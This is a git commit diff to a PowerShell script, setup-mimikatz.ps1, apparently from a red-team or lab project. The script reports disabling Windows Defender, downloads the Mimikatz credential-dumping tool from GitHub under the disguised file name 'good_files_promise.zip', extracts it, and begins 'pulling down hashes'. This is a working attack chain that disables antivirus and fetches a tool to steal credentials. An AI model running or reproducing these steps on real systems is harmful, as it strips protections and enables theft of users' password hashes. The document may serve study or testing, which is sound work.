5d5e4a46a0353859e7294797cad1da6f1799038a
Kyle Topasna <kyle.topasna@gmail.com>
2021-03-25 14:43:21 -0800

    Update setup-mimikatz.ps1

--- setup-mimikatz.ps1
+++ setup-mimikatz.ps1
@@ -3,11 +3,11 @@ Write-Output "[+] Disabled Windows Defender"
 
 $url = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200715/mimikatz_trunk.zip"
 
-$output = "$PSScriptRoot\good_files_promise.zip"
+$output = "~\good_files_promise.zip"
 
 Invoke-WebRequest -Uri $url -OutFile $output
 
-Expand-Archive .\mimikatz.zip
+Expand-Archive ~\good_files_promise.zip
 Write-Output "[+] Mimikatz downloaded and extracted"
 
 Write-Output "[+] Pulling down hashes"
